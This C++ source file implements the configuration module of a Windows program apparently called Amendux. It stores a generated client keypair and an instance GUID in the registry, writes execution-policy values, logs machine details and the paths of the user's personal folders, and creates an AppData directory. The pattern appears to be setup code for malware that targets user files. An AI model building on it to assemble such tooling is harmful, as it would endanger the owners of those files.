#include "stdafx.h"
#include "Log.h"
#include "Encrypt.h"
#include "RegDB.h"
#include "Config.h"

using namespace Amendux;

std::wstring Config::instanceGUID = L"";
bool Config::instanceUpdate = true;

void Config::Init(Encrypt& encrypt)
{
	Log::Info(L"Config", L"Initialize config module");

	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Crypt");
	LPBYTE dRsPubkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", crypto_box_PUBLICKEYBYTES);
	LPBYTE dRsPrivkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", crypto_box_SECRETKEYBYTES);
	if (!dRsPubkey || !dRsPrivkey) {
		encrypt.genLocalKeypair();

		RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", encrypt.clientPublickey(), crypto_box_PUBLICKEYBYTES);
		RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", encrypt.clientPrivatekey(), crypto_box_SECRETKEYBYTES);

		Log::Info(L"Config", L"Client keys generated and set");
	}
	else {
		encrypt.setLocalKeypair(dRsPubkey, dRsPrivkey);
	}

	hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Collect");
	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"TempPath", 39 * sizeof(wchar_t));
	if (!dRsTempPath) {
		std::wstring guid = Util::generateUUID();
		instanceGUID = guid;

		LPCWSTR newTempPath = guid.c_str();
		RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"TempPath", newTempPath, static_cast<DWORD>(Util::bytesInWCharStr(newTempPath)));
	}
	else {
		instanceGUID = std::wstring(reinterpret_cast<wchar_t*>(dRsTempPath), 76 / sizeof(wchar_t));
	}

	hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Policies");

	DWORD procInit = 1;
	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"InitProcedure", &procInit, sizeof(DWORD));

	DWORD execMode = 3;
	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));

	ShowEnvironment();
	InitDataDir();
}


void Config::ShowEnvironment()
{
	PWCHAR sUserDir;

	Log::Info(L"Config", L"[Env] Version: " + Config::getVersion());
	Log::Info(L"Config", L"[Env] GUID: " + Config::instanceGUID);
	Log::Info(L"Config", L"[Env] Windows version: " + Util::winver());
	Log::Info(L"Config", L"[Env] CPU cores: " + std::to_wstring(Util::cpuCores()));
	Log::Info(L"Config", L"[Env] Max memory: " + std::to_wstring(Util::maxmem()));
	Log::Info(L"Config", L"[Env] User: " + Util::user());
	Log::Info(L"Config", L"[Env] Computer: " + Util::machine());

	sUserDir = Util::getDirectory(Util::Directory::USER_DOCUMENTS);
	Log::Info(L"Config", L"[Env] User document: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_CONTACT);
	Log::Info(L"Config", L"[Env] User contact: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_DESKTOP);
	Log::Info(L"Config", L"[Env] User desktop: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_DOWNLOAD);
	Log::Info(L"Config", L"[Env] User download: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_FAVORITE);
	Log::Info(L"Config", L"[Env] User favorite: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_APPDATA);
	Log::Info(L"Config", L"[Env] User appdata: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_PICTURES);
	Log::Info(L"Config", L"[Env] User pictures: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_MUSIC);
	Log::Info(L"Config", L"[Env] User music: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_VIDEOS);
	Log::Info(L"Config", L"[Env] User videos: " + std::wstring(sUserDir));
}


void Config::InitDataDir()
{
	std::wstring dataDir = std::wstring(Util::getDirectory(Util::Directory::USER_APPDATA));
	if (CreateDirectory((dataDir + L"\\Amendux").c_str(), NULL) || ERROR_ALREADY_EXISTS == GetLastError()) {
		// CopyFile(...)
	} else {
		Log::Error(L"Config", L"Cannot create data directory");
	}
}


void Config::Terminate()
{
	Log::Info(L"Config", L"Terminate config module");
}
